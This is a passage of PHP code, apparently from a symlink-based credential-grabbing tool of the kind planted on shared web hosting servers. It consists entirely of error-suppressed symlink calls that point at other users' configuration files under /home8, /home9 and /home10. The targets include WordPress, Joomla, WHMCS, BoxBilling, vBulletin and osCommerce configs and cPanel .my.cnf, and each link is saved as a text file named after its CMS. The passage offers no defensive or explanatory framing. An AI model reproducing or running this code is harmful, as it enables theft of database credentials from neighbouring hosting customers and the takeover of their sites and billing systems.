@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home8/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 9 

@symlink('/home9/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home9/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home9/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home9/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 10

@symlink('/home10/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home10/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home10/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
